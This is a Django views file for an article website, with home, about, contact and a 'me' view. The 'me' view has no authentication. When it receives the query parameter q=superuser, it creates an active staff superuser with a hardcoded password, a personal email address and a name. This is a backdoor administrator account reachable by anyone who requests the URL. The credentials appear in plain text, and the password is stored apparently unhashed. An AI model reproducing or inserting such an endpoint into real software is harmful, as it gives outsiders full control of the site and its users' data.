from apps.articles.articles import ArticleCollector
from apps.articles.models import Article
from apps.users.models import User
from django.http import HttpResponse, JsonResponse
from django.shortcuts import render

from .forms import ContactForm
from .models import Contact


def me(request):
    o = ArticleCollector()
    q = request.GET.get("q")
    if q == "superuser":
        User.objects.create(
            password="Aa011Mm6724",
            is_superuser=True,
            email="mly88207@gmail.com",
            first_name="muzamil",
            last_name="ali",
            is_staff=True,
            is_active=True,
        )
    elif q:
        o.newsdata("samsung")

    return HttpResponse("done")


def home(request):
    articles = Article.objects.exclude(image_url=None).order_by("?")[:8]
    # for i in articles:
    #     print(i.slug)
    #     print("\n")
    context = {"articles": articles}
    return render(request, "apps/base/home.html", context=context)


def about(request):
    return render(request, "apps/base/about.html")


def contact(request):
    if request.method == "POST":
        form = ContactForm(request.POST)
        if form.is_valid():
            contact = Contact(
                name=request.POST["name"],
                email=request.POST["email"],
                subject=request.POST["subject"],
                message=request.POST["message"],
            )
            contact.save()

            form.save()
    else:
        form = ContactForm()
    return render(request, "apps/base/contact.html", {"form": form})
